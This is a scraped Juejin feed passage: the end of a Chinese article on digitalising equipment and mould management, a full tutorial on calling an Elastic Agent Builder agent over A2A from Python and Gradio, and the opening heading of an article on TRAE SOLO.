<p>通过对多个客户项目的优秀实践分析，我们总结出一套适用于多数制造企业的典型管控范围与颗粒度建议，帮助企业在推进数字化设备管理时，更有章法地规划建设路径。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abca90c5d5e248538c9b3255a62db522~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=I8hv1VpxgT8J0qn2TE8BMbrVc%2BY%3D" alt="图片" loading="lazy"/></p>
<p><strong>01</strong>关键方案1：设备/模具资源履历全程可查</p>
<p>通过资源编号可以在低代码系统内查询整个设备生命周期的全部履历档案，档案包括：</p>
<ul>
<li>新模具工装等申购申请；</li>
<li>新模具工装等检测验收；</li>
<li>模具工装入模具库房；</li>
<li>模具工装借出申请；</li>
<li>模具工装实际借出确认；</li>
<li>模具工装上生产线使用前进行扫描；</li>
<li>模具工装生产使用完的归还申请；</li>
<li>模具工装生产使用完的归还前的检测验收；</li>
<li>模具工装生产使用完，检验合格后的入模具库房；</li>
<li>模具使用寿命管理，保养&amp;维修&amp;报废验收。</li>
<li><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cefad3b121b42c2b99dcf6bbea1594c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=z9ailmDo%2BqDtCewsN1fw8JyGj3w%3D" alt="图片" loading="lazy"/></li>
</ul>
<p>02<strong>关键方案2：设备/模具线上管理和追溯维修保养记录</strong></p>
<p>可以通过资源编号或资源类别在IT系统中体现维护、保养、点检的周期要求、自动显示维护、保养、点检checklist，检验项目和检验方法。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99cc7dcf59fa413e8785e1400892a5a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=ZiroqlM8VLpPnpM3ScNapTh41fc%3D" alt="图片" loading="lazy"/></p>
<p>03<strong>关键场景3：异常情况在线实时数据分析</strong></p>
<p>可视化图表展示设备异常情况和发生频率，直观分析异常发生的根本原因。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca0885a55b984855964664b881f0b560~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X5biG5LqR5L2O5Luj56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572370&amp;x-signature=oZo5RPLvFO9Bq97NGGpNhXTABqg%3D" alt="图片" loading="lazy"/></p>
<p>设备管理数字化的价值，首先在于摆脱纸质化与人工低效，实现台账、保养、维修等全过程线上化，提升数据准确性与执行效率；同时，显著增强企业竞争力，在下游客户验厂中展现规范透明的管理能力，助力获得更高评级；部分标杆客户更通过数采融合，实现设备运行监控与预测性维护，让管理从“记录问题”升级为“预防问题”，真正让设备成为可运营的数字资产。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Elastic AI agent builder 介绍（四）]]></title>    <link>https://juejin.cn/post/7575937594351239211</link>    <guid>https://juejin.cn/post/7575937594351239211</guid>    <pubDate>2025-11-24T06:31:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594351239211" data-draft-id="7575751471843000356" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Elastic AI agent builder 介绍（四）"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2025-11-24T06:31:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Elastic AI agent builder 介绍（四）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:31:14.000Z" title="Mon Nov 24 2025 06:31:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41a587aa09344a0ca46d717464d60fc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=3abxUebVCa7HOCchM5UouFyGuBs%3D" alt="" loading="lazy"/></p>
<p>在我之前的文章 “<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152212513" title="https://elasticstack.blog.csdn.net/article/details/152212513" target="_blank" ref="nofollow noopener noreferrer">Elastic AI agent builder 介绍（一）</a>”，我详细地介绍了如何在 Kibana 中创建 tools 及 agents。在今天的文章里，我讲详细地介绍如何在 Python 应用里访问这些 agents。我们可以参考文章 “<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F155162911" title="https://elasticstack.blog.csdn.net/article/details/155162911" target="_blank" ref="nofollow noopener noreferrer">开始使用 Elastic Agent Builder 和 Microsoft Agent Framework</a>”。</p>
<h2 data-id="heading-0">安装</h2>
<p>我们首先参考文章 “<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152212513" title="https://elasticstack.blog.csdn.net/article/details/152212513" target="_blank" ref="nofollow noopener noreferrer">Elastic AI agent builder 介绍（一）</a>” 来进行安装。我们也需要按照这个<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F152212513%23t16" title="https://elasticstack.blog.csdn.net/article/details/152212513#t16" target="_blank" ref="nofollow noopener noreferrer">章节</a>来创建一个叫做 find_the_cheapest_ticket_from_cn_us 的 agent。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae97adf21b174613b3374b27290a991c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=OBr4ulkNMLqytj141KZgpG4mni8%3D" alt="" loading="lazy"/></p>
<p>我们可以在 Agents 界面中进行如上的查询。</p>
<h2 data-id="heading-1">下载代码</h2>
<p>接下来，我们下载已经创建好的代码：</p>
<pre><code class="hljs language-bash" lang="bash">`git <span class="hljs-built_in">clone</span> https://github.com/liu-xiao-guo/ai_agent_builder`AI写代码
</code></pre>
<p>然后我们进入到项目的根目录中，并创建一个叫做 .env 的文件：</p>
<p><strong>.env</strong></p>
<pre><code class="hljs language-ini" lang="ini">`

<span class="hljs-attr">1.  ES_AGENT_URL</span>=http://localhost:<span class="hljs-number">5601</span>/api/agent_builder/a2a
<span class="hljs-attr">2.  ES_API_KEY</span>=WnJwR3RKb0JGQVVCVjdnb29yUkI6RHotbGZBTmJzMDJWUWszbTAtbDVjQQ==
<span class="hljs-attr">3.  AGENT_ID</span>=find_the_cheapest_ticket_from_cn_us

`AI写代码
</code></pre>
<p>我们需要根据自己的配置进行相应的修改。我们可以通过如下的方法来得到你自己的 a2a 地址：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abd5d265ab814ec6953664ca442e916a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=XYpX8y8vN7xf7q4lt%2BqywJi6lpU%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56443e8c71f246eea4b4308711783ca3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=hEgZLXxgSemFHJftsNI3vLpP%2FBw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc0e999a8b8d452fb3b74e3391639a04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=BE8K6KbwWyH2ImRIN20uffY%2FQ%2BU%3D" alt="" loading="lazy"/></p>
<p>针对我的情况，上面的地址是：</p>
<pre><code class="hljs language-bash" lang="bash">`http://localhost:5601/api/agent_builder/mcp`AI写代码
</code></pre>
<p>很显然，上面的地址是给 MCP 而用的。我们需要把上面的 mcp 换成 a2a，这样它的地址就是：</p>
<pre><code class="hljs language-bash" lang="bash">`http://localhost:5601/api/agent_builder/a2a`AI写代码
</code></pre>
<p>接下来，我们来创建一个用于我们访问 Elasticsearch 的 API key：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5049040eadca4be8bedc50976203c121~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=S1zNh%2BYWnH5mm9qQ1F4qPEP4M40%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c6a94446cc3427c9d29292e323b5be1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=clorlG1%2FQu4JdpDxLe5TrKjfIYQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ddb22a3634746f4905d20ca7584c395~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=R2CtvNL%2FapZEjd6BQL%2BOyFC1yjA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78da2b1a3a9a4ae19095c9c112b66c20~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=bC7MGvA2dkY11Lu2kkb9H9VC3LE%3D" alt="" loading="lazy"/></p>
<p>拷贝上面的 key。这样我们就完成了我们的 API key 申请。</p>
<p>另外，我们需要填入我们想要访问的 agent ID，比如上面的 find_the_cheapest_ticket_from_cn_us</p>
<p>接下来，我们需要使用如下的命令来安装所需要的包：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`pip install -r requirements.txt`</span> AI写代码
</code></pre>
<h2 data-id="heading-2">运行代码</h2>
<p>我们的代码非常简单：</p>
<p><strong>access_agents.py</strong></p>
<pre><code class="hljs language-ini" lang="ini">`

1.  import asyncio
2.  from dotenv import load_dotenv
3.  import httpx
4.  import os
5.  from a2a.client import A2ACardResolver
6.  from agent_framework.a2a import A2AAgent

9.  async def main():
10.      load_dotenv()
<span class="hljs-attr">11.      a2a_agent_host</span> = os.getenv(<span class="hljs-string">"ES_AGENT_URL"</span>)
<span class="hljs-attr">12.      a2a_agent_key</span> = os.getenv(<span class="hljs-string">"ES_API_KEY"</span>)
<span class="hljs-attr">13.      agent_id</span> = os.getenv(<span class="hljs-string">"AGENT_ID"</span>)

15.      print(f"Connection to Elastic A2A agent at: {a2a_agent_host}")

<span class="hljs-attr">17.      custom_headers</span> = {<span class="hljs-string">"Authorization"</span>: f<span class="hljs-string">"ApiKey {a2a_agent_key}"</span>}

19.      async with httpx.AsyncClient(<span class="hljs-attr">timeout</span>=<span class="hljs-number">60.0</span>, headers=custom_headers) as http_client:
20.          <span class="hljs-comment"># Resolve the A2A Agent Card</span>
<span class="hljs-attr">21.          resolver</span> = A2ACardResolver(httpx_client=http_client, base_url=a2a_agent_host)
<span class="hljs-attr">22.          agent_card</span> = await resolver.get_agent_card(
<span class="hljs-attr">23.              relative_card_path</span>=f<span class="hljs-string">"/{agent_id}.json"</span>
24.          )
25.          print(f"Found Agent: {agent_card.name} - {agent_card.description}")

27.          <span class="hljs-comment"># Use the Agent</span>
<span class="hljs-attr">28.          agent</span> = A2AAgent(
<span class="hljs-attr">29.              name</span>=agent_card.name,
<span class="hljs-attr">30.              description</span>=agent_card.description,
<span class="hljs-attr">31.              agent_card</span>=agent_card,
<span class="hljs-attr">32.              url</span>=a2a_agent_host,
<span class="hljs-attr">33.              http_client</span>=http_client,
34.          )
<span class="hljs-attr">35.          prompt</span> = input(<span class="hljs-string">"Enter Greeting &gt;&gt;&gt; "</span>)
36.          print("\nSending message to Elastic A2A agent...")
<span class="hljs-attr">37.          response</span> = await agent.run(prompt)
38.          print("\nAgent Response:")
39.          for message in response.messages:
40.              print(message.text)

43.  if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
44.      asyncio.run(main())

`AI写代码!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)
</code></pre>
<p>我们运行上面的应用：</p>
<pre><code class="hljs language-go" lang="go"> <span class="hljs-string">`python access_agents.py`</span> AI写代码
</code></pre>

<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`从中国到美国最便宜的机票是多少？出发城市和到达城市是什么？`</span>AI写代码
</code></pre>

<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  $ pwd
<span class="hljs-bullet">2.</span>  /Users/liuxg/python/ai<span class="hljs-emphasis">_agent_</span>builder
<span class="hljs-bullet">3.</span>  $ ls
<span class="hljs-bullet">4.</span>  README.md        access<span class="hljs-emphasis">_agents.py requirements.txt
5.  $ python access_</span>agents.py 
<span class="hljs-bullet">6.</span>  Connection to Elastic A2A agent at: http://localhost:5601/api/agent<span class="hljs-emphasis">_builder/a2a
7.  Found Agent: Find cheapest price from China to US - Find cheapest price from China to US
8.  Enter Greeting &gt;&gt;&gt; 从中国到美国最便宜的机票是多少？出发城市和到达城市是什么？

10.  Sending message to Elastic A2A agent...

12.  Agent Response:
13.  根据查询结果，从中国到美国最便宜的机票信息如下：

15.  - <span class="hljs-strong">**机票价格**</span>：272.68美元
16.  - <span class="hljs-strong">**出发城市**</span>：广州 (Guangzhou)
17.  - <span class="hljs-strong">**到达城市**</span>：塔尔萨 (Tulsa)

`AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</span></code></pre>
<p>很显然，我们得到了我们想要的结果。</p>
<p>我们也可以使用英文来进行提问：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">`What <span class="hljs-built_in">is</span> the cheapest air-ticket price <span class="hljs-keyword">from</span> China <span class="hljs-keyword">to</span> US? What are the origin city <span class="hljs-built_in">and</span> the destination city?`AI写代码
</code></pre>

<pre><code class="hljs language-markdown" lang="markdown">`

<span class="hljs-bullet">1.</span>  $ python access<span class="hljs-emphasis">_agents.py 
2.  Connection to Elastic A2A agent at: http://localhost:5601/api/agent_</span>builder/a2a
<span class="hljs-bullet">3.</span>  Found Agent: Find cheapest price from China to US - Find cheapest price from China to US
<span class="hljs-bullet">4.</span>  Enter Greeting &gt;&gt;&gt; What is the cheapest air-ticket price from China to US? What are the origin city and the destination city?

<span class="hljs-bullet">6.</span>  Sending message to Elastic A2A agent...

<span class="hljs-bullet">8.</span>  Agent Response:
<span class="hljs-bullet">9.</span>  Based on the flight data, the cheapest air-ticket from China to the US is:

<span class="hljs-bullet">11.</span>  - <span class="hljs-strong">**Price**</span>: $272.68
<span class="hljs-bullet">12.</span>  - <span class="hljs-strong">**Origin City**</span>: Guangzhou, China
<span class="hljs-bullet">13.</span>  - <span class="hljs-strong">**Destination City**</span>: Tulsa, USA

`AI写代码![](<span class="hljs-link">https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png</span>)
</code></pre>
<p>如果我们想使用 gradio 来做一个网页，那么我们可以把我们的代码修改为：</p>
<p><strong>access_agents_gradio.py</strong></p>
<pre><code class="hljs language-ini" lang="ini">`

1.  import asyncio
2.  from dotenv import load_dotenv
3.  import httpx
4.  import os
5.  from a2a.client import A2ACardResolver
6.  from agent_framework.a2a import A2AAgent
7.  import gradio as gr

9.  <span class="hljs-comment"># ---------- Global variables ----------</span>
<span class="hljs-attr">10.  a2a_agent_host</span> = None
<span class="hljs-attr">11.  a2a_agent_key</span> = None
<span class="hljs-attr">12.  agent_id</span> = None
<span class="hljs-attr">13.  agent_card</span> = None
<span class="hljs-attr">14.  custom_headers</span> = None

17.  <span class="hljs-comment"># ---------- Initialize everything once ----------</span>
18.  async def init_agent():
19.      global a2a_agent_host, a2a_agent_key, agent_id, agent_card, custom_headers

21.      load_dotenv()
<span class="hljs-attr">22.      a2a_agent_host</span> = os.getenv(<span class="hljs-string">"ES_AGENT_URL"</span>)
<span class="hljs-attr">23.      a2a_agent_key</span> = os.getenv(<span class="hljs-string">"ES_API_KEY"</span>)
<span class="hljs-attr">24.      agent_id</span> = os.getenv(<span class="hljs-string">"AGENT_ID"</span>)

26.      print(f"Connecting to Elastic A2A agent: {a2a_agent_host}")

<span class="hljs-attr">28.      custom_headers</span> = {<span class="hljs-string">"Authorization"</span>: f<span class="hljs-string">"ApiKey {a2a_agent_key}"</span>}

30.      async with httpx.AsyncClient(<span class="hljs-attr">timeout</span>=<span class="hljs-number">60.0</span>, headers=custom_headers) as http_client:
<span class="hljs-attr">31.          resolver</span> = A2ACardResolver(httpx_client=http_client, base_url=a2a_agent_host)
<span class="hljs-attr">32.          agent_card</span> = await resolver.get_agent_card(
<span class="hljs-attr">33.              relative_card_path</span>=f<span class="hljs-string">"/{agent_id}.json"</span>
34.          )
35.          print(f"Loaded Agent Card: {agent_card.name} - {agent_card.description}")

38.  <span class="hljs-comment"># ---------- Function that Gradio will call ----------</span>
39.  async def call_agent(prompt):
40.      async with httpx.AsyncClient(<span class="hljs-attr">timeout</span>=<span class="hljs-number">60.0</span>, headers=custom_headers) as http_client:
<span class="hljs-attr">41.          agent</span> = A2AAgent(
<span class="hljs-attr">42.              name</span>=agent_card.name,
<span class="hljs-attr">43.              description</span>=agent_card.description,
<span class="hljs-attr">44.              agent_card</span>=agent_card,
<span class="hljs-attr">45.              url</span>=a2a_agent_host,
<span class="hljs-attr">46.              http_client</span>=http_client,
47.          )
<span class="hljs-attr">48.          response</span> = await agent.run(prompt)
49.          return "\n".join(<span class="hljs-section">[msg.text for msg in response.messages]</span>)

52.  <span class="hljs-comment"># ---------- Gradio wrapper (sync → async) ----------</span>
53.  def gradio_handler(prompt):
54.      return asyncio.run(call_agent(prompt))

57.  <span class="hljs-comment"># ---------- Launch Gradio UI ----------</span>
58.  async def launch_gradio():
59.      await init_agent()   <span class="hljs-comment"># Load everything before UI starts</span>

<span class="hljs-attr">61.      iface</span> = gr.Interface(
<span class="hljs-attr">62.          fn</span>=gradio_handler,
<span class="hljs-attr">63.          inputs</span>=gr.Textbox(lines=<span class="hljs-number">2</span>, label=<span class="hljs-string">"Enter Greeting"</span>),
<span class="hljs-attr">64.          outputs</span>=gr.Textbox(label=<span class="hljs-string">"Agent Response"</span>),
<span class="hljs-attr">65.          title</span>=<span class="hljs-string">"Elastic A2A Agent Web UI"</span>
66.      )
67.      iface.launch()

70.  if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
71.      asyncio.run(launch_gradio())

`AI写代码!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/runCode/icon-arrowwhite.png)收起代码块!<span class="hljs-section">[]</span>(https://csdnimg.cn/release/blogv2/dist/pc/img/arrowup-line-top-White.png)
</code></pre>

<pre><code class="hljs language-go" lang="go"><span class="hljs-string">`python access_agents_gradio.py`</span>AI写代码
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51ca5a96ecf9422b908b15e16a934998~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764570674&amp;x-signature=vXKYqhpqK%2BY05LKM%2B75lgSYbTGk%3D" alt="" loading="lazy"/></p>
<p>祝大家使用 AI agent builder 愉快！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE SOLO 新版本 · 这些功能让开发效率翻倍]]></title>    <link>https://juejin.cn/post/7575910333400383542</link>    <guid>https://juejin.cn/post/7575910333400383542</guid>    <pubDate>2025-11-24T06:59:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910333400383542" data-draft-id="7575884229525553188" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE SOLO 新版本 · 这些功能让开发效率翻倍"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2025-11-24T06:59:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TRAE_ai"/> <meta itemprop="url" content="https://juejin.cn/user/3048259110571032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE SOLO 新版本 · 这些功能让开发效率翻倍
